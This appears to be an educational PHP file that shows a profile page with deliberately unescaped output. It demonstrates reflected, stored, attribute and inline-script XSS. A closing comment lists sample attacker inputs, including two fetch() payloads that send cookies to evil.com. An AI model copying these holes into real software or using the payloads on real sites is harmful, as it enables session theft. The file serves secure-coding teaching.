<?php
// vulnerable_profile.php
// Simulates a user profile page — common in forums, e-commerce, social apps
// ❌ DO NOT USE THIS IN PRODUCTION — for educational purposes only

$username   = $_GET['username'];   // User-supplied
$bio        = $_POST['bio'];       // From profile form
$profileUrl = $_GET['redirect'];   // e.g. ?redirect=https://mysite.com/profile

// ❌ VULNERABLE: Direct echo of user input (Reflected XSS)
echo "<h1>Welcome, " . $username . "!</h1>";

// ❌ VULNERABLE: Stored XSS if $bio comes from DB (no encoding on read)
echo "<p class='bio'>" . $bio . "</p>";

// ❌ VULNERABLE: XSS in HTML attribute (breaks out with ')
echo "<a href='" . $profileUrl . "'>View Profile</a>";

// ❌ VULNERABLE: Inline JS context — totally different escaping needed!
echo "<script>var user = '" . $username . "';</script>";

// ❌ VULNERABLE: Using nl2br() without encoding first
// nl2br converts \n to <br> but doesn't escape HTML!
$comment = $_POST['comment'];
echo nl2br($comment);  // attacker injects <script> tags freely

/*
 * What attackers send:
 * username = <script>fetch('https://evil.com/?c='+document.cookie)</script>
 * bio      = <img src=x onerror=alert(document.domain)>
 * redirect = javascript:alert('XSS')   ← JavaScript URL protocol!
 * username (JS context) = '; fetch('https://evil.com/?k='+document.cookie)//
 *
 * CWE-79: Improper Neutralization of Input During Web Page Generation
 */
